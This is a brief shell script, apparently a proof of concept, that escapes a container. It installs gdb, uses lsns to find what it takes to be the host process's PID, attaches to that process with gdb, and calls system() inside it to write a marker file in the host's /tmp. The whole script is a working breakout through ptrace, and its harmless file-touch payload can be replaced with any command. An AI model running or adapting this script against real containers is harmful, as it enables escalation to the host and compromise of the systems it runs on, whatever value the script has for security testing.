#!/bin/sh
echo "Instaling dependencies: "
apt update -qq; apt install -qq -y gdb
echo "Listing Mount namespaces: "
host_pid=`lsns -n -t mnt | awk '{print $4}' | head -1`
echo "Host PID: $host_pid"
echo "Trying to debug host process: "
gdb -p $host_pid << FIN
call (void)system("bash -c 'touch /tmp/container-escape-ptrace-hostpid.txt'")
q
y
FIN
